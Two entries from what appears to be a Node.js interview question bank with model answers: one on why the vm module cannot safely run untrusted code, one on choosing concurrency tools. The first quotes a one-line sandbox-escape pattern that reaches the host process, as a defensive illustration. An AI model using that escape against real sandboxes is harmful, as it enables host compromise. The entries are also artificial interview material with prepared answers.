### NODE-149 — Running untrusted code with vm

**Difficulty:** Staff

**Category:** Isolation

**Question:**

Can `vm.runInNewContext` safely run user-supplied code if you set a timeout?

**Answer:**

No. The Node docs state that `node:vm` is not a security mechanism. Objects passed in expose host constructors, so patterns like `this.constructor.constructor('return process')()` can escape to the host. The `timeout` option only interrupts synchronous execution; async loops, promise chains, and memory exhaustion are not contained. Use a separate process or container with OS sandboxing (seccomp, gVisor, dropped privileges), CPU and memory limits, no network or filesystem access by default, or a purpose-built isolate such as `isolated-vm` with its own caveats.

**Follow-up:**

Is a worker thread enough for untrusted code?

Answer: Not for security. It restricts heap and allows termination, but shares the process, filesystem, network, and credentials with the host.

### NODE-150 — Choosing a concurrency tool

**Difficulty:** Staff

**Category:** Synthesis

**Question:**

Give a compact decision guide for async, workers, child processes, cluster, and the libuv threadpool.

**Answer:**

I/O concurrency: plain `async`/`await`. CPU-bound JavaScript in a process: a worker pool, with transfer or `SharedArrayBuffer` for big binary data. Bursts of native `fs`, DNS, or crypto work: check and tune `UV_THREADPOOL_SIZE`. Other languages or hard fault isolation: `child_process`. Scaling a server across cores: cluster or multiple replicas. Untrusted code: separate process or container, never `vm` alone. Measure with event-loop delay and per-operation timing before and after, and wire every worker or process into graceful shutdown.

**Follow-up:**

What single signal tells you the main thread is the bottleneck?

Answer: Sustained high event-loop delay (`monitorEventLoopDelay` p99) or event-loop utilization near 1 while a CPU profile shows JavaScript frames.
